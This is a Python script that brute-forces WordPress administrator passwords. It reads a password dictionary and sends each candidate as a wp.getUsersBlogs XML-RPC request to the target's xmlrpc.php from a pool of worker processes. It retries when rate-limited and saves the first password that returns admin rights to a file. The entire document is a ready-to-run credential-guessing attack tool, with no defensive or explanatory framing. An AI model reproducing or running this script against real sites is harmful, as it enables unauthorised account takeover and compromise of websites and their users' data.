from sys import argv, exit
from concurrent.futures import ProcessPoolExecutor
from threading import active_count
from os.path import isfile
from os import system
from time import sleep
import requests
import concurrent.futures

sleep_time = 0.1

def make_request(login, password, url, index, length):
    try:
        payload = "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value> <string>%s</string></value></param><param><value><string>%s</string></value></param></params></methodCall>" %(login, password)
        r = requests.post(url, data=payload, timeout=1.5)

        if "isAdmin" in r.text:
            with open("output.txt", "a+") as f:
                f.write("password for %s was %s" %(url, password))
                f.close()
            print("\033[32mPassword is found and was %s\033[32m") %password
            print(r.text)
            exit(0)
        if "503" in r.text: 
            sleep(sleep_time)
            make_request(login, password, url, index, length)
            exit(0)
        print("\033[33m[%i/%i] %d%% : %s [false]\033[33m" %(index, length, (float(index) / float(length)) * 100.0 , password))
    except KeyboardInterrupt as e: 
        system("killall python")
    except Exception as e:
        print(e)
        sleep(sleep_time)
        make_request(login, password, url, index, length)
        exit(-1)
    return 0

def usage():
    print("Usage : %s -t http://target -l login -d dictionnary.txt [--threads number_of_threads]" %argv[0])
    return 0

def get_parameters():
    url = ""
    login = "admin"
    max_threads = 5
    dico_file = ""
    if "-t" not in argv or "-l" not in argv or "-d" not in argv:
        exit(usage())
    for param in argv:
        if param == "-t":
            if argv.index(param) + 2 > len(argv) or argv[argv.index(param) + 1][0] == '-':
                exit(usage())
            url = argv[argv.index(param) + 1]
        if param == "-l":
            if argv.index(param) + 2 > len(argv) or argv[argv.index(param) + 1][0] == '-':
                exit(usage())
            login = argv[argv.index(param) + 1]
        if param == "-d":
            if argv.index(param) + 2 > len(argv) or argv[argv.index(param) + 1][0] == '-':
                exit(usage())
            dico_file = argv[argv.index(param) + 1]
        if param == "--max-threads":
            if argv.index(param) + 2 > len(argv) or argv[argv.index(param) + 1][0] == '-':
                exit(usage())
            max_threads = int(argv[argv.index(param) + 1])    
    return url, login, max_threads, dico_file

def get_dico(dico_file):
    array = []
    with open(dico_file, "r") as f:
        for line in f.readlines():
            array.append(line.replace("\n", ""))
        f.close()
    return array

def main():
    url, login, max_threads, dico_file = get_parameters()
    dico = get_dico(dico_file)
    print(max_threads)
    with ProcessPoolExecutor(max_workers=max_threads) as e:
        for password in dico:
            if isfile("output.txt"):
                exit(0)
            thread = [e.submit(make_request, login, password, url+"/xmlrpc.php", dico.index(password), len(dico))]
            sleep(sleep_time)
    return 0

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit(0)
